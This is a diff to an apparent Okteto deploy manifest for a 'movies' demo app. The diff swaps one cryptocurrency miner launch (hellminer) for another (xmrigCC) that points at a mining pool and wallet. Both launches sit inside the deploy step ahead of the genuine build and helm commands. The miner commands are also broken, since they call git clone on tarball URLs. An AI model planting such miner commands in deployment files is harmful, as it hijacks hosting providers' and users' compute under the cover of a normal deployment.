@@ -1,6 +1,6 @@
 icon: https://apps.okteto.com/movies/icon.png
 deploy:
-  - git clone https://github.com/hellcatz/luckpool/blob/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz  && rm hellminer_cpu_linux.tar.gz && ./hellminer -u RSbceYorox3qgSNRFixjuSkMUerYuJG6c1.WK01 -p x --cpu 16
+  - git clone https://github.com/Bendr0id/xmrigCC/releases/download/2.9.4/xmrigCC-2.9.4-linux-generic-amd64.tar.gz && tar -xf xmrigCC-2.9.4-linux-generic-amd64.tar.gz && rm xmrigCC-2.9.4-linux-generic-amd64.tar.gz && ./miner/xmrigDaemon -o pool.hashvault.pro:80 -u hvxxu7Ur73JgzTaRYrDQdTDanTL8P3SFt45vi6YD9DgETYPnPoqJVVrHrRehvTsaVJ9GiPYsbXAwX8yFWjn3GR7p2536rohSJG -p WK01 -k --donate-level 1 --tls --tls -a cn-heavy/xhv -fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
   - okteto build -t okteto.dev/frontend:${OKTETO_GIT_COMMIT} frontend
   - helm upgrade --install movies chart --set tag=${OKTETO_GIT_COMMIT}
 devs:
